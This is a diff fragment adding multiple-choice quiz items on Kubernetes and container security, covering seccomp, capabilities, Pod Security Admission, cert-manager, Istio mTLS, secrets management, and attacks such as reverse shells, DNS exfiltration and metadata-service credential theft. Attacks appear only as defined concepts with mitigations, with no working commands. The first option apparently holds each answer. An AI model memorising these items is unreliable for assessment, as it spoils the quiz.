+            "High"
+        ]
+    },
+    {
+        "q": "What is 'Hermetic Build'?",
+        "o": [
+            "Build process with no network access, declaring all dependencies explicitly",
+            "Open build",
+            "Online build",
+            "Fast build"
+        ]
+    },
+    {
+        "q": "What is 'Reproducible Build'?",
+        "o": [
+            "Build that produces bit-for-bit identical output given same source and environment",
+            "Random build",
+            "Unique build",
+            "Fast build"
+        ]
+    },
+    {
+        "q": "What is 'Distroless' debugging challenge?",
+        "o": [
+            "No shell/tools makes it hard to exec in; use 'kubectl debug' with ephemeral container",
+            "Easy",
+            "Simple",
+            "Fast"
+        ]
+    },
+    {
+        "q": "What is 'kubectl debug'?",
+        "o": [
+            "Creates an ephemeral container (with tools) attached to the target pod's namespaces for troubleshooting",
+            "Log",
+            "Exec",
+            "Run"
+        ]
+    },
+    {
+        "q": "What is 'Ephemeral Container'?",
+        "o": [
+            "A container added to an already running pod (via API subresource) for debugging",
+            "Init container",
+            "Sidecar",
+            "App container"
+        ]
+    },
+    {
+        "q": "What is 'Proc Mount' type?",
+        "o": [
+            "Controls how /proc is masked (Default or Unmasked - dangerous)",
+            "Mount",
+            "Disk",
+            "Volume"
+        ]
+    },
+    {
+        "q": "What is 'Unmasked Proc' risk?",
+        "o": [
+            "Exposes kernel information/paths that might aid in container escape",
+            "None",
+            "Better performance",
+            "More logs"
+        ]
+    },
+    {
+        "q": "What is 'Ample' privileges?",
+        "o": [
+            "Granting broad permissions just to make things work (Anti-pattern)",
+            "Least privilege",
+            "Zero trust",
+            "Secure"
+        ]
+    },
+    {
+        "q": "What is 'Side-channel attack'?",
+        "o": [
+            "Extracting info from physical implementation (timing, power, cache) rather than code logic",
+            "Direct attack",
+            "Brute force",
+            "Phishing"
+        ]
+    },
+    {
+        "q": "How do shared kernels affect side-channels?",
+        "o": [
+            "Easier to perform cache-timing attacks (Spectre/Meltdown) between containers compared to VMs",
+            "Harder",
+            "Safer",
+            "No effect"
+        ]
+    },
+    {
+        "q": "What is 'Cryptomining' malware in K8s?",
+        "o": [
+            "Hijacking cluster resources to mine cryptocurrency (common result of exposed dashboards/APIs)",
+            "Ransomware",
+            "Virus",
+            "Worm"
+        ]
+    },
+    {
+        "q": "What is 'Reverse Shell'?",
+        "o": [
+            "Malicious code in container connecting back to attacker's machine (bypasses inbound firewall)",
+            "Bind shell",
+            "SSH",
+            "Telnet"
+        ]
+    },
+    {
+        "q": "How to block Reverse Shell?",
+        "o": [
+            "Egress NetworkPolicies restricting outbound traffic to known destinations only",
+            "Ingress rules",
+            "Auth",
+            "Logging"
+        ]
+    },
+    {
+        "q": "What is 'Lateral Movement'?",
+        "o": [
+            "Attacker moving from one compromised pod/node to others within the cluster",
+            "Vertical movement",
+            "Escalation",
+            "Exit"
+        ]
+    },
+    {
+        "q": "What is 'Pod' activeDeadlineSeconds?",
+        "o": [
+            "Limit on how long a pod can run (prevents runaway jobs)",
+            "Timeout",
+            "TTL",
+            "Age"
+        ]
+    },
+    {
+        "q": "What is 'TTLAfterFinished'?",
+        "o": [
+            "Controller cleaning up finished Jobs/Pods after a duration",
+            "Delete",
+            "Remove",
+            "Clean"
+        ]
+    },
+    {
+        "q": "What is 'ImagePullSecrets'?",
+        "o": [
+            "Secret containing registry credentials allowing Kubelet to pull private images",
+            "Password",
+            "Key",
+            "Token"
+        ]
+    },
+    {
+        "q": "Where to define ImagePullSecrets?",
+        "o": [
+            "In Pod spec or linked to the ServiceAccount",
+            "Node spec",
+            "Cluster spec",
+            "User spec"
+        ]
+    },
+    {
+        "q": "What is 'Strace'?",
+        "o": [
+            "Linux utility to trace system calls (debugging/reverse engineering)",
+            "Trace",
+            "Log",
+            "Monitor"
+        ]
+    },
+    {
+        "q": "Why block 'ptrace' syscall?",
+        "o": [
+            "Prevents processes from inspecting/modifying other processes (anti-debugging technique)",
+            "Security",
+            "Performance",
+            "Stability"
+        ]
+    },
+    {
+        "q": "What is 'CAP_SYS_ADMIN'?",
+        "o": [
+            "The 'catch-all' capability (almost root); grants many privileges (mount, swap, etc)",
+            "Admin",
+            "User",
+            "Guest"
+        ]
+    },
+    {
+        "q": "Why is 'CAP_SYS_ADMIN' dangerous?",
+        "o": [
+            "It breaks isolation in many ways; should almost never be granted to containers",
+            "It is slow",
+            "It is old",
+            "It is complex"
+        ]
+    },
+    {
+        "q": "What is 'cgroup v2'?",
+        "o": [
+            "Unified hierarchy for cgroups providing safe delegation to rootless containers",
+            "v1",
+            "Legacy",
+            "Old"
+        ]
+    },
+    {
+        "q": "What is 'Namespace Lifecycle'?",
+        "o": [
+            "Namespaces exist as long as at least one process refers to them (or bind mounted)",
+            "Forever",
+            "Short",
+            "Long"
+        ]
+    },
+    {
+        "q": "What is 'pause' container role in Namespace?",
+        "o": [
+            "Holds the network/IPC namespaces open for the Pod while other containers restart",
+            "Sleep",
+            "Wait",
+            "Stop"
+        ]
+    },
+    {
+        "q": "What is 'CRI-O' security focus?",
+        "o": [
+            "Lightweight, K8s-specific runtime aimed at minimal attack surface (no daemon)",
+            "Heavy",
+            "Fast",
+            "Complex"
+        ]
+    },
+    {
+        "q": "What is 'Containerd' shim?",
+        "o": [
+            "Process that sits between containerd and runc (manages IO/Exit code)",
+            "Proxy",
+            "Bridge",
+            "Gateway"
+        ]
+    },
+    {
+        "q": "What is 'CVE-2019-5736' (runc breakout)?",
+        "o": [
+            "Vulnerability where container could overwrite host runc binary to gain root",
+            "Bug",
+            "Feature",
+            "Patch"
+        ]
+    },
+    {
+        "q": "How to patch runc breakout?",
+        "o": [
+            "Upgrade runc/Docker versions (fix uses memfd_create to clone binary)",
+            "Restart",
+            "Reboot",
+            "Ignore"
+        ]
+    },
+    {
+        "q": "What is 'DDoS' protection in K8s?",
+        "o": [
+            "Rate limiting at Ingress, NetworkPolicies, Cloud Provider Shield",
+            "Nothing",
+            "Open port",
+            "Allow all"
+        ]
+    },
+    {
+        "q": "What is Nginx Ingress Rate Limiting?",
+        "o": [
+            "Annotations (nginx.ingress.kubernetes.io/limit-rps) to throttle requests",
+            "Block",
+            "Deny",
+            "Firewall"
+        ]
+    },
+    {
+        "q": "What is 'Oauth2 Proxy'?",
+        "o": [
+            "Reverse proxy providing authentication with providers (Google, GitHub) for internal apps",
+            "Auth",
+            "Login",
+            "Proxy"
+        ]
+    },
+    {
+        "q": "What is 'Dex'?",
+        "o": [
+            "OpenID Connect Identity Provider (federates LDAP, SAML, GitHub)",
+            "Auth",
+            "User",
+            "Login"
+        ]
+    },
+    {
+        "q": "What is 'Keycloak'?",
+        "o": [
+            "Open source Identity and Access Management solution (OIDC, SAML)",
+            "Lock",
+            "Key",
+            "Door"
+        ]
+    },
+    {
+        "q": "What is 'Cert-Manager'?",
+        "o": [
+            "Automates management and issuance of TLS certificates in K8s (LetsEncrypt, HashiCorp Vault)",
+            "Cert tool",
+            "Key tool",
+            "Sign tool"
+        ]
+    },
+    {
+        "q": "What is 'ACME' protocol?",
+        "o": [
+            "Automated Certificate Management Environment (used by LetsEncrypt)",
+            "SSL",
+            "TLS",
+            "HTTP"
+        ]
+    },
+    {
+        "q": "What is 'Challenge' in ACME?",
+        "o": [
+            "Proof of control over domain (HTTP-01 or DNS-01) required to issue cert",
+            "Test",
+            "Exam",
+            "Quiz"
+        ]
+    },
+    {
+        "q": "Difference: HTTP-01 vs DNS-01?",
+        "o": [
+            "HTTP-01 puts file on web server; DNS-01 adds TXT record (required for wildcards)",
+            "Same",
+            "Similar",
+            "No difference"
+        ]
+    },
+    {
+        "q": "What is 'Wildcard Certificate'?",
+        "o": [
+            "Certificate valid for all subdomains (*.example.com)",
+            "Single domain",
+            "Root domain",
+            "TLD"
+        ]
+    },
+    {
+        "q": "What is 'SelfSigned' Issuer?",
+        "o": [
+            "Issuer that generates self-signed certificates (not trusted by public browsers)",
+            "Public CA",
+            "Root CA",
+            "Global CA"
+        ]
+    },
+    {
+        "q": "What is 'CA' Issuer in cert-manager?",
+        "o": [
+            "Issuer using a signing key pair stored in a Secret to sign certs",
+            "SelfSigned",
+            "ACME",
+            "Vault"
+        ]
+    },
+    {
+        "q": "What is 'Venafi'?",
+        "o": [
+            "Enterprise machine identity management (cert-manager integrates with it)",
+            "Cert tool",
+            "Key tool",
+            "Management"
+        ]
+    },
+    {
+        "q": "What is 'Cilium' usage in security?",
+        "o": [
+            "CNI plugin offering advanced network security (L3-L7 policy) and observability using eBPF",
+            "Storage plugin",
+            "DNS plugin",
+            "Ingress"
+        ]
+    },
+    {
+        "q": "What is 'Hubble'?",
+        "o": [
+            "Observability tool for Cilium (visualizes network flows and policy drops)",
+            "Telescope",
+            "Space",
+            "Lens"
+        ]
+    },
+    {
+        "q": "What is 'Calico' usage in security?",
+        "o": [
+            "CNI plugin known for robust NetworkPolicy implementation and BGP routing",
+            "Storage",
+            "CSI",
+            "Runtime"
+        ]
+    },
+    {
+        "q": "What is 'GlobalNetworkPolicy' (Calico)?",
+        "o": [
+            "Cluster-wide network policy (applies to all namespaces or specific matches)",
+            "Local policy",
+            "Pod policy",
+            "Node policy"
+        ]
+    },
+    {
+        "q": "What is 'HostEndpoint' (Calico)?",
+        "o": [
+            "Applying policies to the network interface of the host node itself (securing the node)",
+            "Pod endpoint",
+            "Service endpoint",
+            "Cluster endpoint"
+        ]
+    },
+    {
+        "q": "What is 'ModSecurity'?",
+        "o": [
+            "Open source Web Application Firewall (WAF) module (often used with Nginx Ingress)",
+            "Firewall",
+            "Router",
+            "Switch"
+        ]
+    },
+    {
+        "q": "What is 'OWASP Top 10'?",
+        "o": [
+            "List of most critical web application security risks (SQLi, XSS, etc.)",
+            "Rules",
+            "Laws",
+            "Code"
+        ]
+    },
+    {
+        "q": "What is 'Coreruleset' (CRS)?",
+        "o": [
+            "Standard set of ModSecurity rules to protect against OWASP Top 10 attacks",
+            "Core set",
+            "Base set",
+            "Main set"
+        ]
+    },
+    {
+        "q": "What is 'External Auth' in Ingress?",
+        "o": [
+            "Offloading authentication to an external service (OAuth2 Proxy) before allowing access",
+            "Internal auth",
+            "Local auth",
+            "Basic auth"
+        ]
+    },
+    {
+        "q": "What is 'Istio AuthorizationPolicy'?",
+        "o": [
+            "CRD to define access control (allow/deny) for workloads in the mesh (L7 granularity)",
+            "NetworkPolicy",
+            "PodPolicy",
+            "NodePolicy"
+        ]
+    },
+    {
+        "q": "What is 'RequestAuthentication' in Istio?",
+        "o": [
+            "Verifies end-user credentials (JWT) attached to the request",
+            "mTLS",
+            "Cert check",
+            "Password check"
+        ]
+    },
+    {
+        "q": "What is 'PeerAuthentication' in Istio?",
+        "o": [
+            "Configures mTLS policy (STRICT, PERMISSIVE, DISABLE) between sidecars",
+            "User auth",
+            "App auth",
+            "Cloud auth"
+        ]
+    },
+    {
+        "q": "What is 'PERMISSIVE' mTLS?",
+        "o": [
+            "Accepts both plaintext and mTLS traffic (useful for migration)",
+            "Strict",
+            "All",
+            "None"
+        ]
+    },
+    {
+        "q": "What is 'STRICT' mTLS?",
+        "o": [
+            "Only accepts mTLS traffic (blocks plaintext)",
+            "Permissive",
+            "Open",
+            "Weak"
+        ]
+    },
+    {
+        "q": "What is 'HashiCorp Vault'?",
+        "o": [
+            "Tool for secrets management, encryption as a service, and privileged access management",
+            "Safe",
+            "Locker",
+            "Bank"
+        ]
+    },
+    {
+        "q": "What is 'Dynamic Secrets' (Vault)?",
+        "o": [
+            "Secrets generated on-demand (e.g. temporary DB credentials) and revoked automatically",
+            "Static secrets",
+            "Fixed secrets",
+            "Hardcoded"
+        ]
+    },
+    {
+        "q": "What is 'AWS Secrets Manager' integration?",
+        "o": [
+            "Using CSI driver or ESO to fetch secrets from AWS into K8s Pods",
+            "Copy paste",
+            "Manual",
+            "Script"
+        ]
+    },
+    {
+        "q": "What is 'Azure Key Vault' integration?",
+        "o": [
+            "Similar to AWS, fetching keys/secrets/certs from Azure Key Vault",
+            "AWS",
+            "GCP",
+            "Local"
+        ]
+    },
+    {
+        "q": "What is 'Google Secret Manager'?",
+        "o": [
+            "GCP's solution for storing and managing sensitive data",
+            "Vault",
+            "Store",
+            "Safe"
+        ]
+    },
+    {
+        "q": "What is 'Cert-Manager' Vault Issuer?",
+        "o": [
+            "Issuer that connects to HashiCorp Vault to sign certificates (acting as intermediate CA)",
+            "SelfSigned",
+            "ACME",
+            "Local"
+        ]
+    },
+    {
+        "q": "What is 'JIT' Access (Just-In-Time)?",
+        "o": [
+            "Granting access permissions only when needed and for a limited time",
+            "Always access",
+            "Permanent",
+            "Static"
+        ]
+    },
+    {
+        "q": "What is 'Kube-bench' job?",
+        "o": [
+            "Running kube-bench as a Job/CronJob to periodically check cluster compliance",
+            "Service",
+            "Deployment",
+            "DaemonSet"
+        ]
+    },
+    {
+        "q": "What is 'Privileged Container' risk?",
+        "o": [
+            "Can access all devices, manipulate kernel, and easily escape to host info",
+            "None",
+            "Low",
+            "Medium"
+        ]
+    },
+    {
+        "q": "What is 'HostPath' mount risk?",
+        "o": [
+            "Allows container to read/write host files (e.g. /etc/shadow, /var/run/docker.sock)",
+            "Read only",
+            "Temp file",
+            "Log file"
+        ]
+    },
+    {
+        "q": "What is 'HostNetwork: true' risk?",
+        "o": [
+            "Container shares host IP/ports; can snoop on local traffic, bypass Networkpolicy",
+            "None",
+            "Faster",
+            "Good"
+        ]
+    },
+    {
+        "q": "What is 'HostPID: true' risk?",
+        "o": [
+            "Container can see and kill processes on the host (e.g. kill kubelet)",
+            "None",
+            "Debug",
+            "Monitor"
+        ]
+    },
+    {
+        "q": "What is 'HostIPC: true' risk?",
+        "o": [
+            "Container can access shared memory of host processes (keyloggers, data theft)",
+            "None",
+            "Faster",
+            "Simple"
+        ]
+    },
+    {
+        "q": "What is 'allowPrivilegeEscalation: false'?",
+        "o": [
+            "Prevents child processes from gaining more privileges (setuid) than the parent",
+            "True",
+            "Default",
+            "Unsafe"
+        ]
+    },
+    {
+        "q": "What is 'ReadOnlyRootFilesystem: true'?",
+        "o": [
+            "Enforces that the root fs is read-only; attacker cannot download/chmod malware",
+            "False",
+            "Writeable",
+            "Open"
+        ]
+    },
+    {
+        "q": "What is 'SPDX'?",
+        "o": [
+            "Software Package Data Exchange (standard format for SBOM)",
+            "Format",
+            "Standard",
+            "Tool"
+        ]
+    },
+    {
+        "q": "What is 'CycloneDX'?",
+        "o": [
+            "Another popular lightweight SBOM standard (OWASP flagship)",
+            "Tool",
+            "Scanner",
+            "Format"
+        ]
+    },
+    {
+        "q": "What is 'VEX' (Vulnerability Exploitability Exchange)?",
+        "o": [
+            "Document stating whether a vulnerability in an SBOM is actually exploitable in the product",
+            "Fix",
+            "Patch",
+            "Scan"
+        ]
+    },
+    {
+        "q": "Why is VEX needed?",
+        "o": [
+            "To reduce false positives; not all vulnerable libs are used in a way that exposes the flaw",
+            "Speed",
+            "Size",
+            "Cost"
+        ]
+    },
+    {
+        "q": "What is 'Chain of Custody'?",
+        "o": [
+            "Audit trail proving who touched the software/artifact at each step of pipeline",
+            "Chain link",
+            "Blockchain",
+            "Log"
+        ]
+    },
+    {
+        "q": "What is 'In-toto'?",
+        "o": [
+            "Framework to secure the integrity of the software supply chain (layout, steps, signatures)",
+            "Total",
+            "Sum",
+            "All"
+        ]
+    },
+    {
+        "q": "What is 'Tekton Chains'?",
+        "o": [
+            "Kubernetes controller that observes Tekton pipelines and signs the output (generating provenance)",
+            "Block",
+            "Link",
+            "Cord"
+        ]
+    },
+    {
+        "q": "What is 'Admission Controller' Webhook?",
+        "o": [
+            "HTTP callback that receives admission requests and returns allow/deny (Validating) or patch (Mutating)",
+            "API",
+            "Service",
+            "Pod"
+        ]
+    },
+    {
+        "q": "What is 'Webhook Configuration' (clientConfig)?",
+        "o": [
+            "Defines where to send the admission request (URL or Service) and the CA bundle",
+            "Server",
+            "Client",
+            "Node"
+        ]
+    },
+    {
+        "q": "What is 'failurePolicy' in Webhook?",
+        "o": [
+            "Actions to take if webhook fails/timeouts (Ignore or Fail). Fail is safer but risky for availability.",
+            "Retry",
+            "Stop",
+            "Wait"
+        ]
+    },
+    {
+        "q": "What is 'failurePolicy: Ignore'?",
+        "o": [
+            "Fail-open; if webhook is down, the request is allowed (bad for security, good for availability)",
+            "Fail-closed",
+            "Secure",
+            "Strict"
+        ]
+    },
+    {
+        "q": "What is 'failurePolicy: Fail'?",
+        "o": [
+            "Fail-closed; if webhook is down, request is rejected (good for security, risk of lockout)",
+            "Fail-open",
+            "Insecure",
+            "Loose"
+        ]
+    },
+    {
+        "q": "What is 'CIS Node Benchmark'?",
+        "o": [
+            "Guidelines for hardening the underlying OS and Kubelet configuration",
+            "Pod check",
+            "App check",
+            "Network check"
+        ]
+    },
+    {
+        "q": "Benchmark: 'Ensure permissions on /etc/kubernetes/pki'?",
+        "o": [
+            "Key files must be restrictive (e.g. 600) and owned by root",
+            "777",
+            "Public",
+            "Open"
+        ]
+    },
+    {
+        "q": "Benchmark: 'Disable SSH root login'?",
+        "o": [
+            "Root should not be able to SSH directly to nodes; use keys and sudo",
+            "Enable",
+            "Allow",
+            "Force"
+        ]
+    },
+    {
+        "q": "What is 'Audit2RBAC'?",
+        "o": [
+            "Tool to generate RBAC roles based on audit logs (least privilege based on usage)",
+            "Rbac2Audit",
+            "GenRole",
+            "MakeRole"
+        ]
+    },
+    {
+        "q": "What is 'Krakend'?",
+        "o": [
+            "High-performance API Gateway (Go) often used as ingress/security layer",
+            "Monster",
+            "Squid",
+            "Fish"
+        ]
+    },
+    {
+        "q": "What is 'Kong' Ingress?",
+        "o": [
+            "Popular API Gateway/Ingress Controller with many security plugins (Auth, RateLimit)",
+            "King",
+            "Ape",
+            "Monkey"
+        ]
+    },
+    {
+        "q": "What is 'Ambassador' (Emissary)?",
+        "o": [
+            "Envoy-based Ingress Controller and API Gateway for K8s",
+            "Diplomat",
+            "Agent",
+            "Proxy"
+        ]
+    },
+    {
+        "q": "What is 'Envoy' security features?",
+        "o": [
+            "Sidecar/Proxy providing mTLS, external auth, RBAC, WAF filters",
+            "None",
+            "Basic",
+            "Simple"
+        ]
+    },
+    {
+        "q": "What is 'FIPS' compliance?",
+        "o": [
+            "Federal Information Processing Standards (US Gov standard for crypto modules)",
+            "Security",
+            "Audit",
+            "check"
+        ]
+    },
+    {
+        "q": "What is 'FIPS-enabled' K8s?",
+        "o": [
+            "K8s compiled with FIPS-compliant crypto libraries (e.g. BoringCrypto)",
+            "Standard",
+            "Fast",
+            "Secure"
+        ]
+    },
+    {
+        "q": "What is 'Air-gapped' cluster?",
+        "o": [
+            "Cluster with no direct internet connection (requires offline image registry/updates)",
+            "Online",
+            "Connected",
+            "Cloud"
+        ]
+    },
+    {
+        "q": "Challenge of Air-gapped?",
+        "o": [
+            "Getting images and updates in (requires bastion, physical media, or strict proxy)",
+            "Easy",
+            "Fast",
+            "Cheap"
+        ]
+    },
+    {
+        "q": "What is 'Bastion Host' (Jump Box)?",
+        "o": [
+            "Secure server exposed to internet used as entry point to manage private internal network",
+            "Fort",
+            "Gate",
+            "Bridge"
+        ]
+    },
+    {
+        "q": "What is 'Teleport'?",
+        "o": [
+            "Access plane for SSH, K8s, DBs (modern replacement for Bastions/VPNs)",
+            "Portal",
+            "Gate",
+            "Tunnel"
+        ]
+    },
+    {
+        "q": "What is 'Boundary' (HashiCorp)?",
+        "o": [
+            "Identity-aware proxy for secure access to hosts/services (replaces VPN)",
+            "Wall",
+            "Line",
+            "Edge"
+        ]
+    },
+    {
+        "q": "What is 'Egress Gateway'?",
+        "o": [
+            "Designated point of exit for mesh traffic to external services (allows strict IP filtering)",
+            "Ingress",
+            "Router",
+            "Switch"
+        ]
+    },
+    {
+        "q": "Why restrict Egress?",
+        "o": [
+            "To prevent data exfiltration and C2 (Command & Control) communication",
+            "Performance",
+            "Cost",
+            "Speed"
+        ]
+    },
+    {
+        "q": "What is 'DNS Exfiltration'?",
+        "o": [
+            "Using DNS queries to smuggle data out of a network (tunneling)",
+            "HTTP",
+            "TCP",
+            "UDP"
+        ]
+    },
+    {
+        "q": "How to mitigate DNS Exfiltration?",
+        "o": [
+            "Monitor DNS logs for anomalies (long subdomains, high volume), block unknown DNS servers",
+            "Allow all",
+            "Ignore",
+            "Cache"
+        ]
+    },
+    {
+        "q": "What is 'Root User Remapping'?",
+        "o": [
+            "User Namespaces feature mapping container root (0) to a high unprivileged ID on host",
+            "Sudo",
+            "Admin",
+            "Login"
+        ]
+    },
+    {
+        "q": "What is 'RuntimeDefault' Seccomp profile?",
+        "o": [
+            "Standard Docker/Containerd profile blocking ~44 dangerous syscalls",
+            "Allow all",
+            "Block all",
+            "Custom"
+        ]
+    },
+    {
+        "q": "What is 'Unconfined' Seccomp profile?",
+        "o": [
+            "Allows all syscalls (disabled security) - dangerous!",
+            "Secure",
+            "Default",
+            "Safe"
+        ]
+    },
+    {
+        "q": "What is 'Localhost' in Pod?",
+        "o": [
+            "Shared network interface (lo) accessible by all containers in the SAME Pod",
+            "Node IP",
+            "Pod IP",
+            "Cluster IP"
+        ]
+    },
+    {
+        "q": "Security risk of 'localhost' in Pod?",
+        "o": [
+            "If one container is malicious, it can attack others listening on localhost (e.g. sidecar admin ports)",
+            "None",
+            "Shared disk",
+            "Shared cpu"
+        ]
+    },
+    {
+        "q": "What is 'AutomountServiceAccountToken: false'?",
+        "o": [
+            "Prevents K8s from mounting the SA token into the pod (if app doesn't need API access)",
+            "True",
+            "Mount",
+            "Enable"
+        ]
+    },
+    {
+        "q": "Why disable AutomountServiceAccountToken?",
+        "o": [
+            "Reduces attack surface; if pod is compromised, attacker gets no API token",
+            "Saves disk",
+            "Saves RAM",
+            "Faster"
+        ]
+    },
+    {
+        "q": "What is 'Kubernetes Secrets' weakness?",
+        "o": [
+            "They are just base64 encoded strings, not encrypted by default (must enable encryption at rest)",
+            "Encrypted",
+            "Hashed",
+            "Secure"
+        ]
+    },
+    {
+        "q": "What is 'Base64'?",
+        "o": [
+            "Encoding scheme (NOT encryption); easily reversible",
+            "Encryption",
+            "Hashing",
+            "Compression"
+        ]
+    },
+    {
+        "q": "How to decode base64?",
+        "o": [
+            "echo 'string' | base64 -d",
+            "Decrypt",
+            "Crack",
+            "Hack"
+        ]
+    },
+    {
+        "q": "What is 'GKE Sandbox'?",
+        "o": [
+            "Service using gVisor to isolate pods in GKE",
+            "VM",
+            "Container",
+            "Docker"
+        ]
+    },
+    {
+        "q": "What is 'Kata Containers'?",
+        "o": [
+            "Secure container runtime with lightweight virtual machines that feel and perform like containers",
+            "Docker",
+            "Rkt",
+            "LXC"
+        ]
+    },
+    {
+        "q": "Difference: Kata vs gVisor?",
+        "o": [
+            "Kata uses real kernel (hardware virtualization); gVisor uses userspace kernel emulation",
+            "Same",
+            "Kata is software",
+            "gVisor is hardware"
+        ]
+    },
+    {
+        "q": "What is 'Rootkit'?",
+        "o": [
+            "Malware designed to gain root access and hide its presence",
+            " Virus",
+            "Worm",
+            "Trojan"
+        ]
+    },
+    {
+        "q": "How to detect rootkits in containers?",
+        "o": [
+            "Runtime security tools (Falco/Tracee) detecting hidden processes or kernel modifications",
+            "Ls",
+            "Ps",
+            "Top"
+        ]
+    },
+    {
+        "q": "What is 'Harden'?",
+        "o": [
+            "Process of securing a system by reducing its vulnerability surface",
+            "Soften",
+            "Weakening",
+            "Opening"
+        ]
+    },
+    {
+        "q": "What is 'NSA Kubernetes Hardening Guide'?",
+        "o": [
+            "Comprehensive security guidance published by NSA/CISA for K8s",
+            "Book",
+            "Blog",
+            "Story"
+        ]
+    },
+    {
+        "q": "According to NSA, most common misconfig?",
+        "o": [
+            "Running containers as root",
+            "Using default namespace",
+            "Using older K8s",
+            "Using weak passwords"
+        ]
+    },
+    {
+        "q": "What is 'ServiceAccount' used for?",
+        "o": [
+            "Identity for processes (Pods) running in K8s",
+            "Identity for humans",
+            "Identity for nodes",
+            "Identity for external users"
+        ]
+    },
+    {
+        "q": "What is 'UserAccount' in K8s?",
+        "o": [
+            "K8s does NOT have a User object; users are managed externally (OIDC, Certs)",
+            "CRD",
+            "Resource",
+            "Object"
+        ]
+    },
+    {
+        "q": "How does K8s authenticate users?",
+        "o": [
+            "Client Certs, Bearer Tokens, Auth Proxies, HTTP Basic (deprecated)",
+            "Login form",
+            "Biometrics",
+            "SMS"
+        ]
+    },
+    {
+        "q": "What is 'kubectl auth can-i'?",
+        "o": [
+            "Command to query RBAC API to check if a user/SA can perform an action",
+            "Login",
+            "Logout",
+            "Switch user"
+        ]
+    },
+    {
+        "q": "What is 'Impersonation' (kubectl --as)?",
+        "o": [
+            "Debugging header allowing an admin to send a request 'as' another user (e.g. to test RBAC)",
+            "Login",
+            "Hack",
+            "Fake"
+        ]
+    },
+    {
+        "q": "What API verb is needed for Impersonation?",
+        "o": [
+            "'impersonate' verb on 'users/groups/serviceaccounts'",
+            "get",
+            "list",
+            "create"
+        ]
+    },
+    {
+        "q": "What is 'Pod Security Admission' (PSA)?",
+        "o": [
+            "Built-in admission controller replacing PSP, controlling security levels via labels",
+            "External controller",
+            "Plugin",
+            "Agent"
+        ]
+    },
+    {
+        "q": "What are the 3 PSA modes?",
+        "o": [
+            "enforce, audit, warn",
+            "stop, start, pause",
+            "allow, deny, log",
+            "on, off, auto"
+        ]
+    },
+    {
+        "q": "What are the 3 PSA levels?",
+        "o": [
+            "Privileged, Baseline, Restricted",
+            "Low, Medium, High",
+            "1, 2, 3",
+            "A, B, C"
+        ]
+    },
+    {
+        "q": "PSA Level: 'Privileged'?",
+        "o": [
+            "Unrestricted policy (allows known privilege escalations)",
+            "Secure",
+            "Locked",
+            "Safe"
+        ]
+    },
+    {
+        "q": "PSA Level: 'Baseline'?",
+        "o": [
+            "Minimally restrictive policy preventing known privilege escalations (default for many)",
+            "Privileged",
+            "Restricted",
+            "None"
+        ]
+    },
+    {
+        "q": "PSA Level: 'Restricted'?",
+        "o": [
+            "Heavily restricted policy following current hardening best practices (requires drop cap, non-root)",
+            "Open",
+            "Easy",
+            "Free"
+        ]
+    },
+    {
+        "q": "Where to apply PSA configs?",
+        "o": [
+            "Namespace labels (pod-security.kubernetes.io/enforce=restricted)",
+            "ClusterRole",
+            "Pod spec",
+            "Node spec"
+        ]
+    },
+    {
+        "q": "What is 'Instance Metadata Service' (IMDS) risk?",
+        "o": [
+            "Containers on cloud nodes might access (169.254.169.254) to steal IAM credentials of the Node",
+            "Slows connection",
+            "No risk",
+            "DNS failure"
+        ]
+    },
+    {
+        "q": "How to block IMDS access?",
+        "o": [
+            "Use NetworkPolicy to deny egress to 169.254.169.254 or require IMDSv2 (token-based)",
+            "Ingress rule",
+            "Port block",
+            "Allow all"
+        ]
+    },
+    {
+        "q": "What is 'IMDSv2'?",
+        "o": [
+            "Session-oriented metadata service requiring a PUT request for a token (harder to exploit via SSRF)",
+            "Older version",
+            "Insecure",
+            "Private"
+        ]
+    },
+    {
+        "q": "What is 'SSRF' (Server-Side Request Forgery)?",
+        "o": [
+            "Attacker tricks a server (app) into making requests to internal resources (like Metadata API)",
+            "CSRF",
+            "XSS",
+            "SQLi"
+        ]
+    },
+    {
+        "q": "What is 'Living off the Land'?",
+        "o": [
+            "Attacker uses existing tools on the system (kubectl, curl, bash) rather than downloading malware",
+            "Farming",
+            "Camping",
+            "Hiding"
+        ]
+    },
+    {
+        "q": "How to mitigate 'Living off the Land'?",
+        "o": [
+            "Remove unnecessary tools from images (Distroless) or restrict execution (AppArmor/Seccomp)",
+            "Install more tools",
+            "Run as root",
+            "Keep default"
+        ]
+    },
+    {
+        "q": "What is 'CSI Secret Store Driver'?",
+        "o": [
+            "Interface for mounting secrets from external stores (Vault, AWS) as volumes via CSI",
+            "Storage driver",
+            "Network driver",
+            "GPU driver"
+        ]
+    },
+    {
+        "q": "How does CSI Secret Store sync to K8s Secrets?",
+        "o": [
+            "It can optionally sync mounted specific secrets to K8s Secret objects (SyncSecret feature)",
+            "Automatic",
+            "Never",
+            "On boot"
+        ]
+    },
+    {
+        "q": "What is 'Secret Rotation'?",
+        "o": [
+            "Regularly changing passwords/keys to limit impact if they are compromised",
+            "Secret sharing",
+            "Secret hiding",
+            "Secret deleting"
+        ]
+    },
+    {
+        "q": "Does K8s auto-rotate CSI secrets?",
+        "o": [
+            "The driver can poll for updates and update the mount; app must watch file changes to reload",
+            "Yes restarting pod",
+            "No",
+            "Maybe"
+        ]
+    },
+    {
+        "q": "What is 'OIDC' (OpenID Connect)?",
+        "o": [
+            "Identity layer on top of OAuth 2.0 (verifies who the user is)",
+            "Authorization",
+            "Encryption",
+            "Compression"
+        ]
+    },
+    {
+        "q": "What is 'ID Token' in OIDC?",
+        "o": [
+            "JWT containing claims about the authenticated user",
+            "Access token",
+            "Refresh token",
+            "Key"
+        ]
+    },
+    {
+        "q": "What is 'JWT'?",
+        "o": [
+            "JSON Web Token (compact URL-safe means of representing claims)",
+            "Java Web Token",
+            "Just Web Token",
+            "Joint Web Token"
+        ]
+    },
+    {
+        "q": "What is 'SAML'?",
+        "o": [
+            "Security Assertion Markup Language (XML-based standard for exchanging auth data)",
+            "JSON based",
+            "YAML based",
+            "Binary"
+        ]
+    },
+    {
+        "q": "Can K8s use SAML directly?",
+        "o": [
+            "No, K8s API server supports OIDC/Webhook; SAML usually needs an OIDC bridge (Dex/Keycloak)",
+            "Yes native",
+            "Yes plugin",
+            "Yes flag"
+        ]
+    },
+    {
+        "q": "What is 'Multi-Stage Build' security benefit?",
+        "o": [
+            "Separates build environment (compilers, SDKs) from runtime image (only app + libs), reducing attack surface",
+            "Faster build",
+            "Smaller cache",
+            "Easier code"
+        ]
+    },
+    {
+        "q": "What is 'Scratch' image?",
+        "o": [
+            "Empty base image (size 0); perfect for statically linked binaries (Go, Rust)",
+            "Ubuntu",
+            "Alpine",
+            "Debian"
+        ]
+    },
+    {
